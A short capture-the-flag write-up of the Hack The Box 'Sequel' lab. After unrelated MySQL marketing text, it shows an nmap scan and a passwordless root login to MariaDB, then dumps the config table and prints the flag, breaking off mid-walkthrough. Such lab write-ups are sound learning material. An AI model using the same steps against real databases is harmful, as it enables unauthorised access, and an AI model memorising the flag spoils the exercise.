# HTB sequel

published by- Joker8123

## Introduction
	MySQL is the most widely adopted open source relational database and serves as the primary relational data store for many popular websites, applications, and commercial products. With more than 20 years of community-backed development and support, MySQL is a reliable, stable, and secure SQL-based database management system. The MySQL database is suitable for a wide variety of use cases, including mission critical apps, dynamic websites, and as an embedded database for software, hardware, and appliances.

	AWS supports MySQL in a variety of ways, including a fully managed database service, Amazon Relational Database Service (RDS) for MySQL. Amazon Aurora with MySQL compatibility is also built using MySQL, and Amazon RDS supports the popular MySQL fork project, MariaDB. You can also host MySQL on Amazon EC2 and self-manage the database, or browse the 3rd party MySQL offerings on AWS Marketplace. 


`nmap scan`

```bash
sudo nmap -sC -sV 10.129.202.182
```
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-17 10:42 IST
Nmap scan report for 10.129.202.182
Host is up (0.31s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 69
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, FoundRows, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, LongColumnFlag, Support41Auth, ConnectWithDatabase, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: k/CEmw/,'~gj^v
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 260.15 seconds


```

In this scan we have a mysql database port is open `3306/tcp open  mysql?`, we need check any vernarabalities on sql database. for that we using mysql tool.

```
sudo apt install mysql
```
then we using the host flag = -h
					user flag = -u

```bash
sudo mysql -h <target host> -u root
```

we got sql shell,in this lets check the any database sheets are present
for the command sheet [mysql command sheet](https://www.mysqltutorial.org/mysql-cheat-sheet/), refer this site

we are using this cammands
```
show databases;
use htb;
show tables;
select * from config;
```
it give a flag : 7b4bec00d1a39e3dd4e021ec3d915da8


after this
